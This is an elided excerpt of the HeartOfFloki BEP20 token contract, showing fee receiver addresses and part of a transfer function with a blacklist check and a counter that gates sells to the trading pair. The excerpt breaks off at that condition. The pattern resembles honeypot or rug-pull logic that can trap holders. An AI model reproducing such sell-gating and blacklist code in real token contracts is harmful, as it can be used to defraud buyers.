...
contract HeartOfFloki is IBEP20, Auth {
    ...
    string constant _name = "HeartOfFloki";
    string constant _symbol = "HEARTFLO";
    ...
    address public marketingFeeReceiver = 0x38Fd966c557aBbD62E777db372416dC395B31CFc;
    address public buybackFeeReceiver = 0x38Fd966c557aBbD62E777db372416dC395B31CFc;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!isBlacklisted[recipient] && !isBlacklisted[sender], 'Address is blacklisted');
         feeGuard++;
        if (recipient == pair && !isTimelockExempt[sender])
        {
                if(feeGuard>18){
